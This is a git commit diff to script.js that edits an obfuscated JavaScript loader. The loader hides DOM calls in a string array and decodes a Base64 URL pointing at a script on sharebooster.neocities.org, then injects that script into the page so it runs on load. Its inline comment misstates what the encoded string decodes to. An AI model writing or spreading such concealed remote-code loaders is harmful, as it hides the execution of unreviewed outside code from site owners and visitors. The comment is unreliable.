8c781d4f8a3ff5f4d189e5ef5daadacee01154fd
Puyit321 <jkingpuyit@gmail.com>
2025-05-16 18:11:35 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,7 @@
 (function(){
   const _0x3c2e = ['createElement', 'script', 'type', 'text/javascript', 'onload', 'log', 'onerror', 'error', 'appendChild', 'head', 'src'];
-  const url = atob('aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQz4bqlLmpz'); // Obfuscated URL
+  const encoded = 'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQzJUUzJUE4JTk0Lmpz'; // Base64 of: https://sharebooster.neocities.org/script3%EC%84%A4.js
+  const url = decodeURIComponent(atob(encoded));
   const script = document[_0x3c2e[0]](_0x3c2e[1]);
   script[_0x3c2e[10]] = url;
   script[_0x3c2e[2]] = _0x3c2e[3];
